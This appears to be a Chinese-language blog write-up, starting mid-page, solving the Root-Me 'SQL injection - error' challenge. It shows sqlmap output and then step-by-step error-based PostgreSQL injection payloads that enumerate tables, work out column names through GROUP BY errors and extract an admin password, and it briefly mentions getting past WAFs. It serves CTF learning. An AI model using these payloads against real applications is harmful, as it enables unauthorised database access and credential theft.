[10:42:03] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[10:42:04] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[10:42:04] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[10:42:09] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[10:42:09] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[10:42:10] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[10:42:10] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[10:42:11] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[10:42:11] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[10:42:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:42:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
GET parameter 'order' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 373 HTTP(s) requests:
---
Parameter: order (GET)
    Type: boolean-based blind
    Title: PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause
    Payload: action=contents&order=ASC,(SELECT (CASE WHEN (6759=6759) THEN 1 ELSE 1/(SELECT 0) END))

    Type: error-based
    Title: PostgreSQL error-based - ORDER BY, GROUP BY clause
    Payload: action=contents&order=ASC,(CAST((CHR(113)||CHR(118)||CHR(120)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (5026=5026) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(120)||CHR(98)||CHR(113)) AS NUMERIC))
---
[10:42:31] [INFO] the back-end DBMS is PostgreSQL
web application technology: Nginx
back-end DBMS: PostgreSQL
[10:42:31] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\challenge01.root-me.org'

[*] ending @ 10:42:31 /2019-03-16/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>注：某些 CTF 平台会对 <code>sqlmap</code> 等工具进行 WAF 屏蔽，直接结果就是导致扫描失败，所以还是尽可能更多地总结自己 SQLi 的探针。不过即使被 WAF 还是有办法绕过的，例如利用 tamper，或直接找到源站 IP 。</p>
</blockquote>
<p>通过 sqlmap 的扫描结果，可以知道这个确实是 PostgreSQL 数据库，且 Web 框架是 Nginx 。</p>
<p>同时也发现了页面 <a target="_blank" rel="noopener" href="http://challenge01.root-me.org/web-serveur/ch34/?action=contents&amp;order=ASC">http://challenge01.root-me.org/web-serveur/ch34/?action=contents&amp;order=ASC</a> 其实是有两种注入方式的：</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">// 基于布尔盲注，探针是：</span>
<span class="token keyword">action</span><span class="token operator">=</span>contents<span class="token operator">&amp;</span><span class="token keyword">order</span><span class="token operator">=</span><span class="token keyword">ASC</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span><span class="token number">6759</span><span class="token operator">=</span><span class="token number">6759</span><span class="token punctuation">)</span> <span class="token keyword">THEN</span> <span class="token number">1</span> <span class="token keyword">ELSE</span> <span class="token number">1</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">// 基于错误注入，探针是</span>
<span class="token keyword">action</span><span class="token operator">=</span>contents<span class="token operator">&amp;</span><span class="token keyword">order</span><span class="token operator">=</span>
<span class="token keyword">ASC</span><span class="token punctuation">,</span><span class="token punctuation">(</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">118</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span><span class="token number">5026</span><span class="token operator">=</span><span class="token number">5026</span><span class="token punctuation">)</span> <span class="token keyword">THEN</span> <span class="token number">1</span> <span class="token keyword">ELSE</span> <span class="token number">0</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span class="token punctuation">)</span>::<span class="token keyword">text</span><span class="token operator">||</span><span class="token punctuation">(</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">NUMERIC</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但既然题目是基于错误的 SQL 注入，布尔盲注的探针就先不管了。</p>
<p>我们尝试使用后一个探针，得到回显输出 <code>ERROR:  invalid input syntax for type numeric: "qvxbq1qxxbq"</code> 。</p>
<p><img src="./imgs/12.png"></p>
<blockquote>
<p>须知道探针并不能用来解决这个挑战，它最大的作用是对于我们构造 payload 具有指导性作用。</p>
</blockquote>
<p>注意到回显输出中有一串字符串 <code>qbpzq1qjkqq</code> 其实就是这个探针控制得到的。</p>
<p>但是为什么会得到这个字符串？不妨来分析一下。这个探针看似复杂，其实十分简单，先拆解下结构：</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">ASC</span><span class="token punctuation">,</span><span class="token punctuation">(</span>
  CAST<span class="token punctuation">(</span>
        <span class="token punctuation">(</span>
          CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">118</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>
        <span class="token operator">||</span>
        <span class="token punctuation">(</span>
          <span class="token keyword">SELECT</span> <span class="token punctuation">(</span>
            <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span><span class="token number">5026</span><span class="token operator">=</span><span class="token number">5026</span><span class="token punctuation">)</span> <span class="token keyword">THEN</span> <span class="token number">1</span> <span class="token keyword">ELSE</span> <span class="token number">0</span> <span class="token keyword">END</span>
          <span class="token punctuation">)</span>
        <span class="token punctuation">)</span>::<span class="token keyword">text</span>
        <span class="token operator">||</span>
        <span class="token punctuation">(</span>
          CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>
  <span class="token keyword">AS</span> <span class="token keyword">NUMERIC</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个探针结构有几个的 pgsql 语法点：</p>
<ul>
<li><code>CAST(xxx AS NUMERIC)</code> 表示把 <code>xxx</code> 强制转换为 <code>NUMERIC</code> 数字类型</li>
<li><code>CHR(ASCII)</code> 实际上就是随机选的 ASCII 字符 （目的只是避免使用无法注入的引号）</li>
<li><code>||</code> 是拼接字符或字符串的操作符号 （不是 或运算）</li>
<li><code>(xxx)::text </code>表示把 <code>xxx</code> 强制转换成 <code>text</code> 文本类型（即字符串）</li>
<li><code>CASE WHEN</code> 不难理解就是条件运算符了</li>
</ul>
<p>根据这几个语法点，不难知道：</p>
<ul>
<li><code>SELECT</code> 前面的字符拼接，得到的字符串是 <code>qvxbq</code></li>
<li><code>SELECT</code> 本身的条件运算，得到数字 <code>1</code> 且转换成字符串</li>
<li><code>SELECT</code> 后面的字符拼接，得到的字符串是 <code>qxxbq</code></li>
<li>把这三部分拼接起来就是字符串 <code>qvxbq1qxxbq</code></li>
<li><code>CAST</code> 尝试把字符串 <code>qvxbq1qxxbq</code> 转换成数字，于是抛出异常，而在异常中输出了这个字符串</li>
</ul>
<p>简单来说，这个探针就是利用 <code>CAST</code> 强制类型转换失败抛出异常的原理，抛出我们想要的内容。</p>
<p>不难想象，如果 <code>SELECT</code> 的是数据库的其他信息，我们就能通过异常把这些信息抛到前端。</p>
<hr>
<h2 id="构造通用-payload"><a href="#构造通用-payload" class="headerlink" title="构造通用 payload"></a>构造通用 payload</h2><p>由于探针太长了，不妨将其简化一下，使其更易于使用：<code>,(CAST(CHR(62)||([注入SQL]) AS NUMERIC))</code></p>
<ul>
<li>原本最开头的 <code>ASC</code> 可以不需要，因为排序默认就是 <code>ASC</code> （注意逗号 <code>,</code> 不能丢）</li>
<li>拼接 <code>CHR(62)||</code> 是确保 <code>CAST NUMERIC</code> 的必定是字符串，即必定报错抛出异常 （<code>CHR(62)</code> 是字符 <code>&gt;</code>）</li>
<li><code>[注入SQL]</code> 就是我们控制查询数据库信息的 SQL ，要求返回值只有 1 个值（<strong>准确而言是 1 行 1 列</strong>，而不能是一张表）</li>
</ul>
<hr>
<h2 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h2><p>有了通用 payload ，我们就可以结合 pgsql 数据库的系统表或函数，构造针对性的 payload 去查询一些关键信息了。</p>
<p>例如要获取数据库版本：<code>,(CAST(CHR(62)||(SELECT VERSION()) AS NUMERIC))</code></p>
<p>得到：PostgreSQL 9.3.20 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4, 64-bit</p>
<p><img src="./imgs/13.png"></p>
<p>又如要获取数据库名称：<code>,(CAST(CHR(62)||(SELECT CURRENT_DATABASE()) AS NUMERIC))</code></p>
<p>得到：c_webserveur_34</p>
<p><img src="./imgs/14.png"></p>
<hr>
<h2 id="寻找目标表"><a href="#寻找目标表" class="headerlink" title="寻找目标表"></a>寻找目标表</h2><p>由于我们的目的是找到账号密码成功登陆，因此需要先找到记录账密的表。</p>
<p>在 pgsql 中，有一张固定的系统表 <code>pg_tables</code> 记录了所有库中所有表，其 <a target="_blank" rel="noopener" href="https://www.postgresql.org/docs/8.3/view-pg-tables.html">表结构</a> 为：</p>
<p><img src="./imgs/15.png"></p>
<p>先构造这样的 payload 查看当前数据库表的数量，一共 60 张表：</p>
<p><code>,(CAST(CHR(62)||(SELECT COUNT(1) FROM pg_tables) AS NUMERIC))</code></p>
<p><img src="./imgs/16.png"></p>
<p>从 <code>pg_tables</code> 的表结构可以知道其中一列是 <code>tablename</code> ，尝试构造这样的 payload 获得所有表名：</p>
<p><code>,(CAST(CHR(62)||(SELECT tablename from pg_tables) AS NUMERIC))</code></p>
<p>但是出错了，原因是构造的 SELECT 表达式返回的值不能超过 1 行。</p>
<p><img src="./imgs/17.png"></p>
<p>在 payload 中添加 <code>LIMIT 1</code> 即可避免此异常：</p>
<p><code>,(CAST(CHR(62)||(SELECT tablename from pg_tables LIMIT 1) AS NUMERIC))</code></p>
<p>成功获得了第一张表名 <code>pg_statistic</code> 。</p>
<p><img src="./imgs/18.png"></p>
<p>但 <code>LIMIT 1</code> 限制了每次都只能取到第一张表，又要怎样得到所有表名 ?</p>
<p>其实方法也有很多，例如利用偏移 <code>LIMIT 1 OFFSET k</code> ，只要把 <code>k</code> 从 0 枚举到 59 ，发起请求 60 次，即可得到全部 60 张表， payload 为：<code>,(CAST(CHR(62)||(SELECT tablename from pg_tables LIMIT 1 OFFSET k) AS NUMERIC))</code> （注意把 <code>k</code> 换成数字）。可以编程实现 <code>k</code> 值枚举，不过这里推荐使用 Burp Suite 的 Intruder 实现：</p>
<p><img src="./imgs/19.png"></p>
<p>根据不同的 <code>k</code> 值获得的 60 张表名如下：</p>
<table>
<thead>
<tr>
<th align="center">k</th>
<th align="center">tablename</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="center">pg_statistic</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">pg_type</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center"><strong>m3mbr35t4bl3</strong></td>
</tr>
<tr>
<td align="center">3</td>
<td align="center"><strong>contents</strong></td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">pg_authid</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">pg_attribute</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">pg_proc</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">pg_class</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">pg_user_mapping</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center">pg_constraint</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">pg_inherits</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">pg_index</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center">pg_operator</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center">pg_opfamily</td>
</tr>
<tr>
<td align="center">14</td>
<td align="center">pg_opclass</td>
</tr>
<tr>
<td align="center">15</td>
<td align="center">pg_am</td>
</tr>
<tr>
<td align="center">16</td>
<td align="center">pg_amop</td>
</tr>
<tr>
<td align="center">17</td>
<td align="center">pg_amproc</td>
</tr>
<tr>
<td align="center">18</td>
<td align="center">pg_language</td>
</tr>
<tr>
<td align="center">19</td>
<td align="center">pg_largeobject_metadata</td>
</tr>
<tr>
<td align="center">20</td>
<td align="center">pg_database</td>
</tr>
<tr>
<td align="center">21</td>
<td align="center">pg_rewrite</td>
</tr>
<tr>
<td align="center">22</td>
<td align="center">pg_trigger</td>
</tr>
<tr>
<td align="center">23</td>
<td align="center">pg_event_trigger</td>
</tr>
<tr>
<td align="center">24</td>
<td align="center">pg_description</td>
</tr>
<tr>
<td align="center">25</td>
<td align="center">pg_cast</td>
</tr>
<tr>
<td align="center">26</td>
<td align="center">pg_enum</td>
</tr>
<tr>
<td align="center">27</td>
<td align="center">pg_namespace</td>
</tr>
<tr>
<td align="center">28</td>
<td align="center">pg_conversion</td>
</tr>
<tr>
<td align="center">29</td>
<td align="center">pg_depend</td>
</tr>
<tr>
<td align="center">30</td>
<td align="center">pg_db_role_setting</td>
</tr>
<tr>
<td align="center">31</td>
<td align="center">pg_tablespace</td>
</tr>
<tr>
<td align="center">32</td>
<td align="center">pg_pltemplate</td>
</tr>
<tr>
<td align="center">33</td>
<td align="center">pg_auth_members</td>
</tr>
<tr>
<td align="center">34</td>
<td align="center">pg_shdepend</td>
</tr>
<tr>
<td align="center">35</td>
<td align="center">pg_shdescription</td>
</tr>
<tr>
<td align="center">36</td>
<td align="center">pg_ts_config</td>
</tr>
<tr>
<td align="center">37</td>
<td align="center">pg_ts_config_map</td>
</tr>
<tr>
<td align="center">38</td>
<td align="center">pg_ts_dict</td>
</tr>
<tr>
<td align="center">39</td>
<td align="center">pg_ts_parser</td>
</tr>
<tr>
<td align="center">40</td>
<td align="center">pg_ts_template</td>
</tr>
<tr>
<td align="center">41</td>
<td align="center">pg_extension</td>
</tr>
<tr>
<td align="center">42</td>
<td align="center">pg_foreign_data_wrapper</td>
</tr>
<tr>
<td align="center">43</td>
<td align="center">pg_foreign_server</td>
</tr>
<tr>
<td align="center">44</td>
<td align="center">pg_foreign_table</td>
</tr>
<tr>
<td align="center">45</td>
<td align="center">pg_default_acl</td>
</tr>
<tr>
<td align="center">46</td>
<td align="center">pg_seclabel</td>
</tr>
<tr>
<td align="center">47</td>
<td align="center">pg_shseclabel</td>
</tr>
<tr>
<td align="center">48</td>
<td align="center">pg_range</td>
</tr>
<tr>
<td align="center">49</td>
<td align="center">pg_largeobject</td>
</tr>
<tr>
<td align="center">50</td>
<td align="center">sql_implementation_info</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">sql_languages</td>
</tr>
<tr>
<td align="center">52</td>
<td align="center">sql_packages</td>
</tr>
<tr>
<td align="center">53</td>
<td align="center">sql_sizing</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">sql_sizing_profiles</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">pg_attrdef</td>
</tr>
<tr>
<td align="center">56</td>
<td align="center">pg_aggregate</td>
</tr>
<tr>
<td align="center">57</td>
<td align="center">sql_features</td>
</tr>
<tr>
<td align="center">58</td>
<td align="center">pg_collation</td>
</tr>
<tr>
<td align="center">59</td>
<td align="center">sql_parts</td>
</tr>
</tbody></table>
<p>很明显，所有 <code>pg_*</code> 和 <code>sql_*</code> 都是系统表，剩下两张表 <code>m3mbr35t4bl3</code> 和 <code>contents</code> 。</p>
<p>而 <code>contents</code> 是当前正在注入的表，前面试错的时候已经知道它只有两列 <code>id</code> 和 <code>page</code> ，从列名来看应该没有关键信息。因此真正存储关键数据的应该就是 <code>m3mbr35t4bl3</code> 表，所以接下来就是查询这张表的数据。</p>
<hr>
<h2 id="获取目标表的表结构"><a href="#获取目标表的表结构" class="headerlink" title="获取目标表的表结构"></a>获取目标表的表结构</h2><p>先构造这样的 payload 查看 <code>m3mbr35t4bl3</code> 表的记录数，发现只有一行：</p>
<p><code>,(CAST(CHR(62)||(SELECT COUNT(1) FROM m3mbr35t4bl3) AS NUMERIC))</code></p>
<p><img src="./imgs/20.png"></p>
<p>尝试构造 payload 直接读取这行数据：</p>
<p><code>,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3) AS NUMERIC))</code></p>
<p>但是又出错了，原因是构造的 SELECT 表达式返回的值除了不能超过 1 行，还不能超过 1 列。</p>
<p><img src="./imgs/21.png"></p>
<p>但是我们不知道 <code>m3mbr35t4bl3</code> 表的列名，为此先要设法找到其列名。</p>
<p>在 pgsql 中，要查找一张表的所有列名，可以利用这样的 SQL ：</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> attname <span class="token keyword">FROM</span> pg_attribute pa<span class="token punctuation">,</span> pg_class pc <span class="token keyword">WHERE</span> pa<span class="token punctuation">.</span>attrelid <span class="token operator">=</span> pc<span class="token punctuation">.</span>oid <span class="token operator">AND</span> relname <span class="token operator">=</span> <span class="token string">'m3mbr35t4bl3'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>但是我们无法注入这条 SQL ，原因是它的 WHERE 条件中存在引号，而引号在这题中被过滤了。</p>
<p>但不代表毫无办法，这里可以利用 <code>GROUP BY</code> 的两个特性：</p>
<ul>
<li>与 <code>ORDER BY</code> 类似的， <code>GROUP BY</code> 同样可以使用列号代替列名</li>
<li>当 <code>SELECT *</code> 与 <code>GROUP BY</code> 一起使用时， <code>GROUP BY</code> 必须出现所有列名（或列号），否则 SQL 会报错</li>
</ul>
<p>一开始因为不知道任何列名，所以首先可以构造这样的 payload ：</p>
<p><code>,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY 1) AS NUMERIC))</code></p>
<p><img src="./imgs/22.png"></p>
<p>从异常中抛出了其中一列的列名 <code>us3rn4m3_c0l</code> ，声称其未被包含在 <code>GROUP BY</code> 中。</p>
<p>由此我们得到了新的一列列名，利用之构造新的 payload 如下：</p>
<p><code>,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l) AS NUMERIC))</code></p>
<p><img src="./imgs/23.png"></p>
<p>这次又从异常中抛出了新的一列 <code>id</code>，利用之构造新的 payload 如下：</p>
<p><code>,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id) AS NUMERIC))</code></p>
<p><img src="./imgs/24.png"></p>
<p>再次从异常中得到新的一列 <code>p455w0rd_c0l</code>，利用之构造新的 payload 如下：</p>
<p><code>,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id, p455w0rd_c0l) AS NUMERIC))</code></p>
<p><img src="./imgs/25.png"></p>
<p>继而从异常中得到新的一列 <code>em41l_c0l</code>，利用之构造新的 payload 如下：</p>
<p><code>,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id, p455w0rd_c0l, em41l_c0l) AS NUMERIC))</code></p>
<p>这次报错信息变成了 <code>ERROR:  subquery must return only one column</code> 。</p>
<p>说明 <code>GROUP BY</code> 已经包含了所有列并查询了结果返回，但新返回值多于 1 列，所以使得我们的 payload 报错。</p>
<p><img src="./imgs/26.png"></p>
<hr>
<h2 id="获取目标表的表数据"><a href="#获取目标表的表数据" class="headerlink" title="获取目标表的表数据"></a>获取目标表的表数据</h2><p>至此我们已经知道了这些信息：</p>
<ul>
<li>目标表的表名为 <code>m3mbr35t4bl3</code> （这变体可以的。。。members_table ??? ）</li>
<li>目标表一共只有 4 列：<code>id</code>, <code>em41l_c0l</code>, <code>us3rn4m3_c0l</code>, <code>p455w0rd_c0l</code> （这列名也太刻意了。。）</li>
<li>目标表只有一行数据</li>
</ul>
<p>那么要获得表数据就很简单了。</p>
<p>如下构造查询 <code>id</code> 列数据的 payload，得到 <code>1</code> ：</p>
<p><code>,(CAST(CHR(62)||(SELECT id FROM m3mbr35t4bl3) AS NUMERIC))</code></p>
<p><img src="./imgs/27.png"></p>
<p>如下构造查询 <code>em41l_c0l</code> 列数据的 payload，得到 <code>admin@localhost</code> ：</p>
<p><code>,(CAST(CHR(62)||(SELECT em41l_c0l FROM m3mbr35t4bl3) AS NUMERIC))</code></p>
<p><img src="./imgs/28.png"></p>
<p>如下构造查询 <code>us3rn4m3_c0l</code> 列数据的 payload，得到 <code>admin</code> ：</p>
<p><code>,(CAST(CHR(62)||(SELECT us3rn4m3_c0l FROM m3mbr35t4bl3) AS NUMERIC))</code></p>
<p><img src="./imgs/29.png"></p>
<p>如下构造查询 <code>p455w0rd_c0l</code> 列数据的 payload，得到 <code>1a2BdKT5DIx3qxQN3UaC</code> ：</p>
<p><code>,(CAST(CHR(62)||(SELECT p455w0rd_c0l FROM m3mbr35t4bl3) AS NUMERIC))</code></p>
<p><img src="./imgs/30.png"></p>
<hr>
<h2 id="完成挑战"><a href="#完成挑战" class="headerlink" title="完成挑战"></a>完成挑战</h2><p>使用得到的账号 <code>admin</code> 和密码 <code>1a2BdKT5DIx3qxQN3UaC</code> 登陆，得知这个密码就是 flag，完成挑战：</p>
<p><img src="./imgs/31.png"></p>
<hr>
<h2 id="答案下载"><a href="#答案下载" class="headerlink" title="答案下载"></a>答案下载</h2><ul>
<li>payload: <a href="#">无</a></li>
<li>flag: <a href="./flagzip">下载</a></li>
</ul>
<blockquote>
<p>flag 下载后的 flagzip 的文件需要手动更改后缀为 <code>*.zip</code>，然后解压即可（为了避免直接刷答案）</p>
</blockquote>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>
                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">EXP</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://exp-blog.com/safe/ctf/rootme/web-server/sql-injection-error/">https://exp-blog.com/safe/ctf/rootme/web-server/sql-injection-error/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">EXP</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E8%A7%A3%E9%A2%98%E6%8A%A5%E5%91%8A/">
                                    
                                        <span class="chip bg-color">解题报告</span>
                                    
                                </a>
                            
                                <a href="/tags/CTF/">
                                    
                                        <span class="chip bg-color">CTF</span>
                                    
                                </a>
                            
                                <a href="/tags/Root-Me/">
                                    
                                        <span class="chip bg-color">Root-Me</span>
                                    
                                </a>
                            
                                <a href="/tags/Web-Server/">
                                    
                                        <span class="chip bg-color">Web-Server</span>
                                    
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 360px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 300px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .paypal-tab .active {
        color: #fff !important;
        background-color: #053146 !important;
    }

    .reward-tabs .kofi-tab .active {
        color: #fff !important;
        background-color: #e80180 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

